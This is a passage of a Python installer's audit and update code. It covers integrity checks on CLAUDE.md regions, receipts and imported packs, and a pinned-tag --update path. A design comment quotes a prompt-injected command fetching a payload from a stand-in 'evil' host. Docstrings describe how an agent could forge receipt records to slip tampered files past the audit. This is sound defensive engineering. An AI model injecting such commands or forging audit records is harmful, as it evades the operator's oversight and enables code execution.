    # region (see _strip_pack_pointer_prefix) — invisible to everything
    # below so check 3 keeps reasoning only about what IT owns.
    data = _strip_pack_pointer_prefix(data, receipt)
    s_marker, e_marker = MARKER_START.encode(), MARKER_END.encode()
    starts, ends = data.count(s_marker), data.count(e_marker)

    if starts == 0 and ends == 0:
        if gw and gw.get("written"):
            return _flagged("3", "CLAUDE.md region", ["receipt records an approved region but none is present on disk"])
        expected = baseline_entry["hash"] if baseline_entry else _sha256_bytes(b"")
        if baseline_entry and _sha256_bytes(data) != expected:
            return _flagged("3", "CLAUDE.md region", ["content differs from the pre-install baseline, no gated write on record"])
        return _pass("3", "CLAUDE.md region")

    if starts != 1 or ends != 1:
        return _flagged("3", "CLAUDE.md region",
                         [f"malformed markers: {starts} start(s), {ends} end(s) — exactly one region expected"])
    s, e = data.index(s_marker), data.index(e_marker)
    if e < s:
        return _flagged("3", "CLAUDE.md region", ["end marker precedes start marker"])

    before = data[:s]
    region = data[s + len(s_marker) + 1: e]
    after = data[e + len(e_marker):]
    problems = []
    if after != b"\n":
        problems.append("unexpected content after the end marker (region must be the last thing in the file)")
    if baseline_entry:
        if baseline_entry.get("hash") is None:
            pass  # too large to have been hashed at baseline time — can't verify
        elif baseline_entry["hash"] == _sha256_bytes(b""):
            # F5 fix (2026-08-06 Gemini review): a 0-byte pre-existing
            # CLAUDE.md still gets a baseline entry (hash of b""), but
            # _approve_claude_md's own `before = (existing + b"\n\n") if
            # existing else b""` never prepends the "\n\n" separator to
            # nothing — before is b"" here too, not b"\n\n". Mirror that
            # branching instead of assuming every baseline implies a
            # trailing separator, or a byte-perfect install false-flags.
            if before != b"":
                problems.append("content outside the region does not match the pre-install baseline")
        elif not before.endswith(b"\n\n") or _sha256_bytes(before[:-2]) != baseline_entry["hash"]:
            problems.append("content outside the region does not match the pre-install baseline")
    elif before != b"":
        problems.append("content outside the region is non-empty but no pre-install baseline is on record (fresh install)")
    if not gw or not gw.get("written"):
        problems.append("region is present but no approval is on record in the receipt")
    elif _sha256_bytes(region) != gw.get("approved_hash"):
        problems.append("region content hash does not match the approved hash in the receipt")

    return _flagged("3", "CLAUDE.md region", problems) if problems else _pass("3", "CLAUDE.md region")


def _check_4(target: Path, receipt: dict) -> dict:
    """Checks the workspace's REAL Claude Code memory store (see
    _mesh_store_dir — ~/.claude/projects/<slug>/memory/, not <ROOT>/memory/;
    that correction was discovered live while testing this wave). Reduced
    scope from the v2 spec's 'equals a pure re-application of the bootstrap
    transform': verifies the approval is on record, MEMORY.md carries the
    GENERATED header, and install.sh's own MEMORY.md.pre-mesh backup
    byte-matches what --approve hashed immediately before running it — not
    full transform equality (replaying fold.py's fold algorithm is real new
    engineering, not built this wave — see docs/install-audit.md 'Explicit
    residuals'). <ROOT>/memory/'s own pre-existing content, if any, is a
    normal baseline-tracked path under check 1 — mesh-bootstrap never
    touches it."""
    gw = receipt.get("gated_writes", {}).get("mesh-bootstrap")
    if not gw or not gw.get("written"):
        return _pass("4", "mesh bootstrap", "declined — not run")

    store_dir_str = gw.get("store_dir")
    if not store_dir_str:
        return _flagged("4", "mesh bootstrap", ["approved but no memory store location was recorded — can't verify"])
    store = Path(store_dir_str)
    memory_md = store / "MEMORY.md"
    pre_mesh = store / "MEMORY.md.pre-mesh"

    problems = []
    if not memory_md.exists():
        problems.append(f"{memory_md} missing after an approved bootstrap")
    else:
        head = memory_md.read_text(encoding="utf-8", errors="replace")[:2000]
        if "GENERATED" not in head:
            problems.append(f"{memory_md} has no GENERATED header — doesn't look fold-managed")

    pre_hash = gw.get("pre_memory_md_hash")
    if pre_hash:
        if not pre_mesh.exists():
            problems.append(f"{pre_mesh} missing — install.sh should have backed up pre-existing content there")
        elif _sha256_file(pre_mesh) != pre_hash:
            problems.append(f"{pre_mesh} does not match the hash --approve recorded immediately before running install.sh")
    elif pre_mesh.exists():
        problems.append(f"{pre_mesh} exists but --approve recorded no pre-existing MEMORY.md at approval time")

    return _flagged("4", "mesh bootstrap", problems) if problems else _pass("4", "mesh bootstrap")


def _check_5(target: Path) -> dict:
    # v2 spec's check 5 wanted a dedicated `keyvault/migrate.py --check`
    # mode detecting half-migration of the operator's real ~/.key. That's
    # host-secret state entirely outside <ROOT>, and no such check-mode
    # exists to call — real new engineering, deliberately not built this
    # wave (see docs/install-audit.md's stated reduction). Shipped keyvault
    # SCRIPTS are already covered by check 1's normal component integrity
    # check; this is a documented placeholder so the report never silently
    # claims coverage it doesn't have.
    return _skipped("5", "keyvault migration state",
                     ["not implemented this wave — shipped script integrity is covered by check 1; "
                      "live ~/.key migration state is not audited — see docs/install-audit.md"])


def _check_6(target: Path) -> dict:
    problems = []
    runs_db = target / "observability" / "data" / "runs.db"
    if runs_db.exists():
        head = runs_db.read_bytes()[:16]
        if not head.startswith(b"SQLite format 3\x00"):
            problems.append("observability/data/runs.db exists but isn't a valid sqlite file")
    return _flagged("6", "runtime-writable plausibility", problems) if problems else _pass("6", "runtime-writable plausibility")


def _check_7(target: Path, receipt: dict) -> dict:
    """Wave 2H-2 (F1 fix, 2026-08-06 Gemini review): cross-check the live
    receipt against the out-of-target anchor _save_receipt mirrors on every
    write. A same-uid agent scoped to --target can edit receipt.json
    directly (forging a baseline entry to launder a tampered file past
    check 1, or forging a gated-write approval record) but can't also
    rewrite the anchor, which lives outside --target. A divergence means
    receipt.json was edited by something other than install.py itself."""
    anchor = _load_anchor(target)
    if anchor is None:
        return _skipped("7", "receipt integrity",
                         ["no out-of-target anchor found for this install — either it predates "
                          "this check or the anchor directory was cleared; receipt.json's "
                          "baseline/approval records cannot be cross-verified against a copy "
                          "the installed tree itself can't write"])
    if anchor != receipt:
        return _flagged("7", "receipt integrity",
                         ["receipt.json differs from the out-of-target anchor recorded on "
                          "install.py's own writes — the live receipt was likely edited directly "
                          "rather than through install.py, which can mean a forged baseline "
                          "entry, a forged approval record, or both; do not trust the other "
                          "checks in this report until you can explain the divergence"])
    return _pass("7", "receipt integrity")


def _check_8(target: Path, receipt: dict) -> dict:
    """P3: cross-checks the cc-pack pointer region (see the GATED_WRITES
    comment) — same marker-counting idiom as check 3, but for a region that
    must be at the START of the file rather than the end (cc-seed's region,
    when present, stays the LAST thing in the file; packs are always written
    before it). check 3 independently owns whatever follows this region,
    including a cc-seed region if one exists — this check does not re-verify
    that content, only its own."""
    claude_md = target / "CLAUDE.md"
    gw = receipt.get("gated_writes", {}).get("import-pack-pointer")
    if not claude_md.exists():
        if gw and gw.get("written"):
            return _flagged("8", "cc-pack pointer region", ["approved+written in receipt but the file is now missing"])
        return _pass("8", "cc-pack pointer region", "no CLAUDE.md and no pack import on record")

    data = claude_md.read_bytes()
    s_marker, e_marker = PACKS_MARKER_START.encode(), PACKS_MARKER_END.encode()
    starts, ends = data.count(s_marker), data.count(e_marker)

    if starts == 0 and ends == 0:
        if gw and gw.get("written"):
            return _flagged("8", "cc-pack pointer region", ["receipt records an approved pack pointer but none is present on disk"])
        return _pass("8", "cc-pack pointer region")
    if starts != 1 or ends != 1:
        return _flagged("8", "cc-pack pointer region",
                         [f"malformed markers: {starts} start(s), {ends} end(s) — exactly one region expected"])
    s, e = data.index(s_marker), data.index(e_marker)
    if e < s:
        return _flagged("8", "cc-pack pointer region", ["end marker precedes start marker"])
    if s != 0:
        return _flagged("8", "cc-pack pointer region",
                         ["pack pointer region is not at the start of the file — it must be "
                          "written first, before any other content"])
    if data[len(s_marker):len(s_marker) + 1] != b"\n":
        # The byte immediately after the start marker is unconditionally
        # skipped below when extracting `region` — if it's NOT the \n
        # _write_packs_pointer always writes, that byte is invisible to the
        # hash check that follows and could smuggle an unaudited byte into
        # CLAUDE.md (2026-08-08 P3 review, GPT). Catch it explicitly rather
        # than silently mis-slicing.
        return _flagged("8", "cc-pack pointer region",
                         ["no newline immediately after the start marker — malformed region"])

    region = data[s + len(s_marker) + 1: e]
    problems = []
    if not gw or not gw.get("written"):
        problems.append("region is present but no approval is on record in the receipt")
    elif _sha256_bytes(region) != gw.get("approved_hash"):
        problems.append("region content hash does not match the approved hash in the receipt")
    return _flagged("8", "cc-pack pointer region", problems) if problems else _pass("8", "cc-pack pointer region")


def _check_9(target: Path, receipt: dict) -> dict:
    """P3: imported-pack content lives entirely outside --target (the
    out-of-repo delivery root — see the GATED_WRITES comment), so check 1's
    target.rglob walk never sees it. This is that check's counterpart for
    the delivery root: every file install.py itself wrote during an
    approved import must still hash-match what the receipt recorded at
    approval time, and nothing extra may have appeared there since — the
    same tamper story as check 1, scoped to where pack content actually
    lives in this design.

    Walks EVERY recorded path via _expected_pack_dest — the RE-DERIVED
    location, never receipt['delivery_path'] (2026-08-08 P3 review, all
    three reviewers independently: trusting delivery_path from a receipt a
    same-uid agent can edit turns this check into an oracle that can be
    pointed anywhere, including outside the delivery root entirely). Also
    covers the two other things a pointer-based design needs auditing:
    PACKS.md itself (the file literally imported into CLAUDE.md — was
    outside audit coverage entirely before this fix) and orphaned pack
    directories under packs/ that exist on disk but aren't in the receipt
    at all (invisible to a per-recorded-pack walk)."""
    imported = receipt.get("imported_packs", {}) or {}
    delivery_root = _pack_delivery_root(target)
    problems = []

    for pid, rec in sorted(imported.items()):
        try:
            dest = _expected_pack_dest(target, pid)
        except ValueError as e:
            problems.append(f"{pid}: {e}")
            continue
        recorded = rec.get("delivery_path")
        if recorded and recorded != str(dest):
            problems.append(f"{pid}: receipt's delivery_path ({recorded}) does not match the "
                            f"re-derived path ({dest}) — this check audits the re-derived path only")
        if dest.is_symlink():
            problems.append(f"{pid}: {dest} is a symlink, not a plain directory — refusing to "
                            f"treat its target as this pack's content")
            continue
        recorded_paths = rec.get("paths") or {}
        if not isinstance(recorded_paths, dict):
            problems.append(f"{pid}: receipt 'paths' is {type(recorded_paths).__name__}, expected an object")
            continue
        seen = set()
        for rel, expected_hash in sorted(recorded_paths.items()):
            if not _pack_is_safe_relpath(rel):
                problems.append(f"{pid}/{rel}: unsafe recorded path, refusing to check it")
                continue
            p = dest / rel
            seen.add(rel)
            if p.is_symlink():
                problems.append(f"{pid}/{rel}: is a symlink, not a plain file — refusing to "
                                f"follow it")
                continue
            if not p.exists() or not p.is_file():
                problems.append(f"{pid}/{rel}: missing (recorded at import time, now absent)")
                continue
            if _sha256_file(p) != expected_hash:
                problems.append(f"{pid}/{rel}: content differs from what was recorded at import time")
        if dest.is_dir():
            for p in sorted(dest.rglob("*")):
                if p.is_symlink():
                    rel = p.relative_to(dest).as_posix()
                    if rel not in seen:
                        problems.append(f"{pid}/{rel}: symlink present on disk but not recorded "
                                        f"in the receipt (possible tamper or manual edit)")
                    continue
                if not p.is_file():
                    continue
                rel = p.relative_to(dest).as_posix()
                if rel not in seen:
                    problems.append(f"{pid}/{rel}: present on disk but not recorded in the "
                                    f"receipt (possible tamper or manual edit)")

    # PACKS.md is a pure function of receipt['imported_packs'] (_render_packs_md)
    # and is the exact file the CLAUDE.md pointer resolves to — audit it by
    # re-rendering from the (already-trusted-at-this-point) receipt and
    # comparing bytes, rather than storing a separate hash to keep in sync.
    packs_md = delivery_root / "PACKS.md"
    if imported or packs_md.exists():
        if packs_md.is_symlink():
            problems.append(f"PACKS.md: {packs_md} is a symlink, not a plain file")
        elif not packs_md.exists():
            problems.append(f"PACKS.md: missing at {packs_md} despite {len(imported)} pack(s) on record")
        elif packs_md.read_bytes() != _render_packs_md(receipt):
            problems.append(f"PACKS.md: {packs_md} does not match what the current receipt "
                            f"would render — edited outside install.py, or stale")

    # Orphaned pack directories: content that exists under packs/ but has no
    # receipt entry at all — invisible to the per-recorded-pack loop above,
    # e.g. left behind by a failed import that got partway through applying
    # before a later step failed (see _approve_import_pack's cleanup, which
    # only covers _apply_pack_generic's own exceptions).
    packs_dir = delivery_root / "packs"
    if packs_dir.is_dir() and not packs_dir.is_symlink():
        for child in sorted(packs_dir.iterdir()):
            if child.name not in imported:
                problems.append(f"{child}: present under the delivery root's packs/ but not "
                                f"recorded in the receipt (orphaned import, or tamper)")

    if not imported and not problems:
        return _pass("9", "imported pack content", "no packs imported")
    return _flagged("9", "imported pack content", problems) if problems else _pass("9", "imported pack content")


def _print_report(report):
    print(f"install.py --audit {report['target']}")
    print(f"installer: version {report['installer_version']}, commit {report['installer_commit']}")
    print(f"package (reference): {report['package']}, commit {report['package_commit']}")
    print()
    print(report["perimeter_disclaimer"])
    print()
    for c in report["checks"]:
        print(f"[{c['status']:>7}] check {c['id']}: {c['name']}")
        for line in c["detail"]:
            print(f"          {_escape_path(str(line))}")
    print()
    print(f"RESULT: {report['result']}")
    if report["result"] == "ERROR":
        print("this is NOT a clean bill of health — --audit could not complete one or more checks.")
    print()
    print("A human reading this output themselves, in a fresh terminal, is the completion "
          "signal — an agent pasting this into chat is not.")


def _safe_check(fn, id_, name, *args):
    """Runs a check function, converting an unexpected exception into an
    ERROR result rather than crashing the whole --audit invocation. Scoped
    to checks 8/9 (P3): both read imported_packs, a structure a same-uid
    agent can shape adversarially via receipt tampering — the exact class
    of hostile input pack_lib.verify_pack's own type-guards exist to
    survive (2026-08-08 P3 review, GPT: 'one exception can abort the whole
    audit instead of producing an ERROR check'). Checks 1-7 pre-date this
    wrapper and are out of scope for this pass (see cc-pack/README.md)."""
    try:
        return fn(*args)
    except Exception as e:
        return _error(id_, name, [f"check crashed: {type(e).__name__}: {e}"])


def do_audit(target: Path, package: Path, as_json: bool) -> int:
    receipt = _load_receipt(target)
    if receipt is None:
        print(f"install.py --audit: no receipt at {target}/{CC_SEED_DIR}/{RECEIPT_NAME} — was "
              f"this target installed with this install.py? Nothing to audit.", file=sys.stderr)
        return 2

    check_8 = _safe_check(_check_8, "8", "cc-pack pointer region", target, receipt)
    check_9 = _safe_check(_check_9, "9", "imported pack content", target, receipt)

    trustworthy, why = _package_is_trustworthy(package)
    if trustworthy:
        checks = [
            _check_1(target, package, receipt),
            _check_2(target, package),
            _check_3(target, receipt),
            _check_4(target, receipt),
            _check_5(target),
            _check_6(target),
            _check_7(target, receipt),
            check_8,
            check_9,
        ]
    else:
        print(f"install.py --audit: cannot certify checks 1/2/6 — {why}. Fix --package and "
              f"re-run; printing what CAN be checked without it.", file=sys.stderr)
        checks = [
            _error("1", "package trace", [why]),
            _error("2", "scheduler", ["skipped — package reference not trustworthy"]),
            _check_3(target, receipt),
            _check_4(target, receipt),
            _check_5(target),
            _error("6", "runtime-writable plausibility", ["skipped — package reference not trustworthy"]),
            _check_7(target, receipt),
            check_8,
            check_9,
        ]

    report = {
        "target": str(target),
        "package": str(package),
        "installer_version": _installer_version(),
        "installer_commit": _installer_commit(),
        "package_commit": _git_commit(package) if trustworthy else "unknown",
        "perimeter_disclaimer": PERIMETER_DISCLAIMER.replace("<ROOT>", str(target)),
        "checks": checks,
    }
    has_error = any(c["status"] == "ERROR" for c in checks)
    has_flagged = any(c["status"] == "FLAGGED" for c in checks)
    report["result"] = "ERROR" if has_error else ("FLAGGED" if has_flagged else "PASS")
    exit_code = 2 if has_error else (1 if has_flagged else 0)

    if as_json:
        print(json.dumps(report, indent=2, sort_keys=True))
    else:
        _print_report(report)
    return exit_code


# --- SEED-076: --update — let an existing install adopt later cc-seed content ---
#
# Every install() to date is a one-time snapshot: nothing in this file could
# ever pull LATER cc-seed improvements onto an already-installed target.
# Found 2026-08-15 auditing why a real install ({{REDACTED}}) was silently 29h
# stale on a memory-mesh bugfix with no update path at all.
#
# Design reviewed by a 3-model panel (grok-4.6/gpt-5.6-terra/gemini-pro,
# 2026-08-15) before any of this was written — every one of the choices
# below is a direct response to a finding they raised, not a guess:
#   - fetch is pinned to an IMMUTABLE git tag (never `main`/HEAD) — grok and
#     openai both flagged "unsigned fetch of mutable main" as a straight
#     regression against this file's own SHA256SUMS+signature bar elsewhere
#     (the pack import path). Full detached-signature verification of a
#     seed release is real, separate follow-on work (not done here — see
#     BACKLOG.md SEED-076); this closes the worse half of that gap (mutable
#     -> immutable) now.
#   - `--from` accepts ONLY a local path or nothing (pinned default);
#     arbitrary URLs are refused outright (Gemini: an agent whose context
#     got prompt-injected with "--update --from https://evil/payload.tar.gz"
#     would otherwise get a straight RCE, since scheduler/skills/_lib are
#     executable content this installer writes unattended).
#   - legacy installs with no recorded per-file "shipped" hash are NEVER
#     assumed pristine (all three panelists independently: doing so would
#     silently overwrite exactly the local customization this feature
#     promises to protect). Bootstrapped from the exact historical commit
#     recorded in receipt.json if resolvable; every existing path is
#     reported SKIP (never silently touched) if it isn't.
#   - detection is unconditional and free; writing anything requires
#     `--apply` (mirrors --apply-proposal's own naming/shape rather than
#     inventing a `--yes`), matching Principle 17 (show what you're
#     approving) and this file's existing pattern for every other gated
#     write.
#   - tar extraction validates every member path stays under the
#     destination before anything touches disk (path-traversal; Gemini
#     named CVE-2007-4559 directly).
#   - a target-scoped advisory lock serializes concurrent --update runs
#     (does NOT yet serialize against --approve/--apply-proposal racing at
#     the same time — named as a residual below, not silently dropped).

# ONE literal ("owner/repo"), not two separate constants: install.py builds
# URLs against multiple domains (github.com AND raw.githubusercontent.com),
# so no existing scrub exception covers "{{REDACTED}}" split across an f-string.
# Found live 2026-08-15 — a bare UPDATE_SOURCE_OWNER = "{{REDACTED}}" got scrubbed
# to "{{REDACTED}}" in the shipped build (valid Python, so syntax_audit
# passed clean; the URL just silently 404s at runtime). This exact literal
# is now a build_seed.py PUBLIC_EXCEPTIONS entry, so it survives scrubbing
# whole.
UPDATE_SOURCE_REPO_SLUG = "cvp1/ai-os-seed"
UPDATE_SOURCE_OWNER, UPDATE_SOURCE_REPO = UPDATE_SOURCE_REPO_SLUG.split("/", 1)
_UPDATE_MAX_BYTES = 50 * 1024 * 1024  # dist/ is a few MB; bound the fetch (Principle 8)
_UPDATE_FETCH_TIMEOUT = 30
SHIPPED_PATHS = COMPONENTS + ROOT_FILES  # the exact surface install() itself writes
# Paths install() WRITES but does not simply copy verbatim — it mutates them
# post-copy (scheduler/manifest.yml gets the operator's live job list
# spliced in by _add_job/_install_default_jobs). Found live in this
# session's own drill: a naive --update overwrite of manifest.yml replaced
# the operator's scheduled repo_hygiene/freshness jobs with the empty
# `jobs: []` the seed ships, which would have silently de-scheduled every
# real job on the next update. --update reports these but NEVER auto-writes
# them — reconciling scheduler entries stays a manual, by-hand act.
UPDATE_MANUAL_ONLY_PATHS = {"scheduler/manifest.yml"}
# Whole COMPONENTS this file already treats as user-owned the moment real
# content exists — install() itself never overwrites memory/ once it's
# there (SATISFIED_BY_EXISTING, _memory_is_pristine): it ships an EMPTY
# starter scaffold that becomes the operator's real, evolving, host-
# specific memory the moment anything writes to it. Missed this in the
# first version of --update and found it in the FIRST real dry run against
# a real install ({{REDACTED}}): memory/MEMORY.md — Craig's actual live memory
# index there — planned as [UPDATE], which would have overwritten it with
# the empty scaffold on --apply. Caught by reading the dry-run plan before
# ever passing --apply; excluded entirely, matching install()'s own
# standing rule for this component rather than inventing a new one.
UPDATE_MANUAL_ONLY_COMPONENTS = {"memory"}


def _update_lock_path(target: Path) -> Path:
    return target / CC_SEED_DIR / ".update.lock"


@contextlib.contextmanager
def _update_lock(target: Path):
    """O_EXCL advisory lock for the duration of one --update run. Only
    serializes --update against itself; it does NOT yet serialize against
    --approve / --apply-proposal running concurrently on the same target —
    a named residual (BACKLOG.md SEED-076), not a silent gap."""
    p = _update_lock_path(target)
    p.parent.mkdir(parents=True, exist_ok=True)
    try:
        fd = os.open(str(p), os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
    except FileExistsError:
        raise SystemExit(
            f"update: {p} already exists — another --update looks to be running "
            f"against this target (or one crashed and left the lock behind; remove "
            f"it by hand once you've confirmed nothing is actually in flight)")
    os.write(fd, f"{os.getpid()} {_now()}\n".encode())
    os.close(fd)
    try:
        yield
    finally:
        p.unlink(missing_ok=True)


def _fetch_url(url: str) -> bytes:
    """GET url, bounded (Principle 8) and timed out. Raises RuntimeError
    with a caller-facing message on any failure — never returns a partial
    or unbounded body."""
    req = urllib.request.Request(url, headers={"User-Agent": "cc-seed-installer"})
    try:
        with urllib.request.urlopen(req, timeout=_UPDATE_FETCH_TIMEOUT) as r:
            data = r.read(_UPDATE_MAX_BYTES + 1)
    except (urllib.error.URLError, OSError, TimeoutError) as e:
        raise RuntimeError(f"could not fetch {url}: {e}")
    if len(data) > _UPDATE_MAX_BYTES:
        raise RuntimeError(f"{url} exceeded the {_UPDATE_MAX_BYTES}-byte fetch cap — refusing")
    if not data:
        raise RuntimeError(f"{url} returned an empty body")
    return data


def _safe_extract_tar(data: bytes, dest: Path) -> Path:
    """Extract a .tar.gz into dest, refusing any member whose resolved path
    would land outside dest (path traversal / CVE-2007-4559 — Gemini's
    finding) and any symlink/hardlink/device member outright (a seed
    archive has no legitimate reason to ship one). Returns the single
    top-level directory GitHub's archive wraps everything in — found
    generically (exactly one top-level entry, and it must be a directory)
    rather than assumed by name, because the naming GitHub picks for a
    given ref is not itself something to trust guessing (grok's review:
    "ambiguous root must fail, not guess")."""
    dest.mkdir(parents=True, exist_ok=True)
    dest_r = dest.resolve()
    import io
    with tarfile.open(fileobj=io.BytesIO(data), mode="r:gz") as tf:
        for m in tf.getmembers():
            if m.issym() or m.islnk() or m.isdev():
                raise RuntimeError(f"update source archive: refusing symlink/hardlink/device "
                                   f"member {m.name!r}")
            target_path = (dest / m.name).resolve()
            if target_path != dest_r and dest_r not in target_path.parents:
                raise RuntimeError(f"update source archive: member {m.name!r} escapes the "
                                   f"extraction directory — refusing to extract")
        tf.extractall(dest)  # safe: every member already validated above
    top = [p for p in dest.iterdir()]
    if len(top) != 1 or not top[0].is_dir():
        raise RuntimeError(f"update source archive: expected exactly one top-level directory, "
                           f"found {[p.name for p in top] or 'none'} — refusing to guess the root")
    return top[0]


def _version_key(v: str):
    """Best-effort ordering for 'X.Y.Z[-suffix]' version strings: numeric
    prefix compares first, and any pre-release suffix sorts BELOW the same
    numeric prefix with no suffix (so 0.2.6-alpha < 0.2.6). Not full semver
    (no suffix-vs-suffix ordering) — sufficient for refusing an accidental
    downgrade, which is all this is used for."""
    m = re.match(r"^(\d+(?:\.\d+)*)(.*)$", v.strip())
    if not m:
        return ((), v)  # unparseable — sorts by raw string, never crashes
    nums = tuple(int(x) for x in m.group(1).split("."))
    suffix = m.group(2)
    return (nums, 0 if not suffix else -1)


def _fetch_ref_tree(ref: str, tmp_parent: Path) -> Path:
    """Fetch+extract an immutable ref (a tag OR a commit sha — GitHub's
    archive endpoint accepts both identically) from the pinned source repo.
    Never accepts a branch name — that's the one thing this function
    exists to make impossible to pass in by accident."""
    if ref in ("main", "master", "HEAD") or "/" in ref:
        raise RuntimeError(f"refusing to fetch update source by mutable/unsafe ref {ref!r}")
    url = (f"https://github.com/{UPDATE_SOURCE_OWNER}/{UPDATE_SOURCE_REPO}"
           f"/archive/{ref}.tar.gz")
    data = _fetch_url(url)
    dest = tmp_parent / f"extract-{ref.replace('/', '_')}"
    return _safe_extract_tar(data, dest)


def _resolve_update_source(explicit_from: str, tmp_parent: Path):
    """Returns (tree: Path, version: str, source_desc: str).

    `explicit_from`: a LOCAL PATH only (an operator-trusted seed clone/dist,
    e.g. for offline use or testing) — never a URL. With no --from, the
    pinned default: read VERSION off `main` (a small text read, not
    executable content — the ACTUAL payload is never taken from main) then
    fetch that exact version's tag archive, which IS immutable and content-
    addressed. If that tag doesn't exist yet (e.g. the first publish after
    this feature shipped, before publish.sh started tagging), this fails
    with a clear message rather than silently falling back to main."""
    if explicit_from:
        tree = Path(explicit_from).expanduser().resolve()
        if not tree.is_dir():
            raise RuntimeError(f"--from {explicit_from!r} is not a directory")
        vf = tree / "VERSION"
        version = vf.read_text().strip() if vf.exists() else "unknown"
        return tree, version, f"local:{tree}"
    if explicit_from == "":
        raise RuntimeError("--from given but empty")
    version_url = (f"https://raw.githubusercontent.com/{UPDATE_SOURCE_OWNER}/"
                   f"{UPDATE_SOURCE_REPO}/main/VERSION")
    version = _fetch_url(version_url).decode("utf-8", "replace").strip()
    if not version or "/" in version or "\n" in version:
        raise RuntimeError(f"implausible VERSION read from {version_url}: {version!r}")
    tag = f"v{version}"
    tree = _fetch_ref_tree(tag, tmp_parent)
    return tree, version, f"{UPDATE_SOURCE_OWNER}/{UPDATE_SOURCE_REPO}@{tag}"


def _shipped_snapshot(tree: Path, paths=None) -> dict:
    """{relpath: {"type": ..., "hash": "sha256:..."}} for every path under
    `paths` (default SHIPPED_PATHS = the exact surface install() writes) in
    `tree`. install() passes its own `written` list explicitly — a --into
    compose install that SKIPPED a component (e.g. the user's own pre-
    existing memory/) must never have that component snapshotted as
    'shipped by us', or a future --update could offer to overwrite content
    that was never ours. Symlinks are recorded by target, never followed;
    over-cap files get hash=None (still enumerated, per the same
    bound-the-loop-not-the-coverage discipline _capture_baseline already
    uses)."""
    snap = {}
    for comp in (paths if paths is not None else SHIPPED_PATHS):
        root = tree / comp
        if not root.exists():
            continue
        paths = [root] if root.is_file() else sorted(root.rglob("*"))
        for p in paths:
            rel = p.relative_to(tree).as_posix()
            st = p.lstat()
            entry = {"type": _lstat_type(st)}
            if entry["type"] == "symlink":
                entry["symlink_target"] = os.readlink(p)
            elif entry["type"] == "file":
                entry["hash"] = _sha256_file(p) if st.st_size <= _MAX_HASH_BYTES else None
            snap[rel] = entry
    return snap


def _reconstruct_legacy_shipped(receipt: dict, tmp_parent: Path):
    """For an install with no receipt["shipped"] yet (everything installed
    before SEED-076): the only honest way to know what was ORIGINALLY
    shipped at each path is to fetch that exact historical commit and
    snapshot it — receipt["install"]["installer_commit"] already records
    it. Returns a shipped-snapshot dict, or None if the commit is unknown
    or can't be fetched (caller must then treat every existing path as
    unknown/dirty — NEVER assume pristine; see the SEED-076 header note)."""
    commit = (receipt.get("install") or {}).get("installer_commit")
    if not commit or commit == "unknown":
        return None
    try:
        tree = _fetch_ref_tree(commit, tmp_parent)
    except RuntimeError:
        return None
    return _shipped_snapshot(tree)


def _is_update_manual_only(rel: str) -> bool:
    if rel in UPDATE_MANUAL_ONLY_PATHS:
        return True
    return rel.split("/", 1)[0] in UPDATE_MANUAL_ONLY_COMPONENTS


def _plan_update(target: Path, shipped_now: dict, new_tree: Path):
    """Three-way plan: for every path the NEW tree would ship, decide
    create / update / skip_dirty / manual_only / unchanged. `shipped_now` is
    the reference "what did we last know we shipped here" snapshot — either
    receipt["shipped"] (normal case) or a freshly-reconstructed one
    (legacy bootstrap) or {} (no history at all -> everything existing is
    dirty by definition, nothing to compare against)."""
    plan = {"create": [], "update": [], "skip_dirty": [], "manual_only": [], "unchanged": []}
    new_snap = _shipped_snapshot(new_tree)
    for rel, new_entry in sorted(new_snap.items()):
        live = target / rel
        if not live.exists() and not live.is_symlink():
            if _is_update_manual_only(rel):
                continue  # doesn't exist yet -> nothing install() would have synthesized either
            plan["create"].append(rel)
            continue
        if _is_update_manual_only(rel):
            plan["manual_only"].append(rel)
            continue
        st = live.lstat()
        live_type = _lstat_type(st)
        live_hash = None
        if live_type == "file" and st.st_size <= _MAX_HASH_BYTES:
            live_hash = _sha256_file(live)
        was = shipped_now.get(rel)
        is_pristine = (was is not None and was.get("type") == live_type
                       and (live_type != "file" or was.get("hash") == live_hash))
        if new_entry.get("type") == live_type and (
                live_type != "file" or new_entry.get("hash") == live_hash):
            plan["unchanged"].append(rel)
        elif is_pristine:
            plan["update"].append(rel)
        else:
            plan["skip_dirty"].append(rel)
    return plan, new_snap


def _apply_update(target: Path, receipt: dict, new_tree: Path, plan: dict, new_snap: dict):
    """Copy every create/update-planned path in, then refresh
    receipt["shipped"] for exactly the paths just written — never for
    skip_dirty paths (those keep whatever shipped record they already had,
    so a future run keeps comparing them against the SAME historical
    reference rather than the new one they were never actually updated
    to)."""
    for rel in plan["create"] + plan["update"]:
        src = new_tree / rel
        dst = target / rel
        entry = new_snap[rel]
        if entry["type"] == "dir":
            dst.mkdir(parents=True, exist_ok=True)
            continue
        dst.parent.mkdir(parents=True, exist_ok=True)
        if entry["type"] == "symlink":
            if dst.exists() or dst.is_symlink():
                dst.unlink()
            os.symlink(entry["symlink_target"], dst)
        else:
            if dst.exists() or dst.is_symlink():
                dst.unlink()
            shutil.copy2(src, dst)
    shipped = dict(receipt.get("shipped") or {})
    for rel in plan["create"] + plan["update"]:
        shipped[rel] = new_snap[rel]
    receipt["shipped"] = shipped


def do_adopt_baseline(target: Path) -> int:
    """SEED-076 follow-up, found live the first time --update ran against a
    REAL install: some installs predate the receipt system itself (pre-
    Wave-2H — no .cc-seed/receipt.json at all), a state even older than the
    "legacy install with a receipt but no shipped history" case --update
    already handles by fetching the historical commit. There is no commit
    to fetch here — nothing on disk records what was ever "shipped" versus
    added later by the operator.

    The panel's explicit recommendation for exactly this case (2026-08-15
    design review, gpt-5.6-terra): "offer an explicit, noisy --adopt-
    baseline/migration workflow that records current hashes as the
    operator-approved baseline; it must not be implicit in --update." This
    is that command. It does NOT claim anything about where the current
    content came from — it just says "starting now, treat exactly this as
    the known-good reference point," which is the only honest thing this
    tool can say about a tree with no history. Requires the operator to
    run it by name; --update never calls it implicitly, and it refuses on
    a target that already has a receipt (that's --update's job, not this
    one's)."""
    if not looks_like_install(target):
        return die(f"{target} doesn't look like an AI-OS Seed install — "
                   f"--adopt-baseline only operates on an existing install")
    if _load_receipt(target) is not None:
        return die(f"{target} already has a {CC_SEED_DIR}/{RECEIPT_NAME} — "
                   f"--adopt-baseline is only for installs that predate receipts "
                   f"entirely (nothing to adopt: --update already has real history here, "
                   f"or use its own legacy-bootstrap path if it's missing 'shipped')")
    present = [c for c in SHIPPED_PATHS if (target / c).exists()]
    shipped = _shipped_snapshot(target, present)
    receipt = {
        # 2 (2026-09-19, SEED-080 bug bash). What changed:
        #   install.refused_skills[]        — a skill the origin rule REFUSED
